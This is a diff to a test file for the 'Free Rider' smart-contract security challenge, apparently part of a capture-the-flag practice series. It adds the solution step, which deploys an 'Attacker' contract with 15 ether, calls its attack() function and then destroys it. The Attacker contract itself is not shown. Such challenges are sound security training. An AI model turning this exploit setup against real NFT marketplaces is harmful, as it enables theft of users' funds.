@@ -98,13 +98,22 @@ describe('[Challenge] Free Rider', function () {
         // Deploy buyer's contract, adding the attacker as the partner
         this.buyerContract = await (await ethers.getContractFactory('FreeRiderBuyer', buyer)).deploy(
             attacker.address, // partner
-            this.nft.address, 
+            this.nft.address,
             { value: BUYER_PAYOUT }
         );
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const attackerContract = await (await ethers.getContractFactory('Attacker', deployer)).deploy(
+            attacker.address,
+            this.buyerContract.address,
+            this.nft.address,
+            this.marketplace.address,
+            { value: ethers.utils.parseEther('15') }
+        );
+        await attackerContract.connect(attacker).attack();
+        await attackerContract.connect(attacker).destroy();
     });
 
     after(async function () {
